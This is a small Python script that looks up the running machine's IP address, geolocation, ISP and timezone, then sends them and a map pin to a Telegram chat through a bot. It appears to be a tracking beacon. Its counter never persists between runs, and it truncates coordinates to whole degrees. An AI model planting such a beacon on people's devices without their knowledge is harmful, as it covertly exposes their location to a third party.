from datetime import datetime
import requests
from telegram.bot import Bot

BotToken = None
ChatID = None
Counter = 1

IpDetails = requests.get("http://ip-api.com/json/").json()

Text = (
    f"Country: {IpDetails['country']}\n"
    f"Country Code: {IpDetails['countryCode']}\n"
    f"Region: {IpDetails['region']}\n"
    f"Region Name: {IpDetails['regionName']}\n"
    f"City: {IpDetails['city']}\n"
    f"isp: {IpDetails['isp']}\n"
    f"org: {IpDetails['org']}\n"
    f"as: {IpDetails['as']}\n"
    f"Zip: {IpDetails['zip']}\n"
    f"IP Address: {IpDetails['query']}\n"
    f"Timezone: {IpDetails['timezone']}\n"
    f"Time: {datetime.now()}\n"
    f"Try Number: {Counter}"
)

Bot(BotToken).send_message(chat_id=ChatID, text=Text)
Bot(BotToken).send_location(chat_id=ChatID, latitude=int(IpDetails['lat']), longitude=int(IpDetails['lon']))

Counter += 1
